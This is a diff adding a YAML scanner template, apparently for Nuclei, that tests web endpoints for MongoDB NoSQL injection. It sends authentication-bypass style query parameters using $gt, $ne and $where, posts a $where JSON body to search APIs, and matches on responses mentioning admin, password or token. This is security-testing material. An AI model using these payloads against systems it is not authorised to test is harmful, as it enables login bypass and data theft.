@@ -1,0 +1,36 @@
+id: nosqli-mongodb-injection
+info:
+  name: NoSQL MongoDB Injection via URL Parameters
+  author: AniipID
+  severity: high
+  description: Tests for NoSQL injection in URL query parameters using $where and $gt operators
+  tags: nosqli,mongodb,injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id[$gt]=&password[$gt]="
+      - "{{BaseURL}}?username[$ne]=admin&password[$ne]=x"
+      - "{{BaseURL}}?search[$where]=1"
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "password"
+          - "email"
+          - "token"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/find"
+    headers:
+      Content-Type: application/json
+    body: '{"$where": "1"}'
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
